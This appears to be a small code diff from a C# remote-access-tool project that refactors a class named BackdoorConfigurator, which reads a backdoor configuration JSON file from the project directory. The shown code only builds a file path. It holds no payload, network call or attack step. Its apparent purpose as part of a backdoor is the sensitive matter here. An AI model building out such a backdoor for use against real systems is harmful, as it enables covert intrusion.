@@ -5,17 +5,17 @@ using System.IO;
 namespace RAT.src.Configuration
 {
     /// <summary>
-    /// Contains logic to work with configuration.
+    /// Contains logic to work with backdoor configuration.
     /// </summary>
-    public static class BackdoorConfigurator
+    public class BackdoorConfigurator
     {
         /// <summary>
         /// Retrieves configuration from JSON file.
         /// </summary>
         /// <returns>Class that represents file configuration.</returns>
-        public static BackdoorConfiguration GetBackdoorConfiguration()
+        public BackdoorConfiguration GetBackdoorConfiguration()
         {
-            // This will get the current PROJECT directory
+            // This will get the current prokect directory
             string projectDirectory = Directory.GetParent(Environment.CurrentDirectory.Trim()).Parent.Parent.FullName;
             string filePath = projectDirectory + "\\src" + "\\Configurations\\" + "BackdoorConfig.json";
 
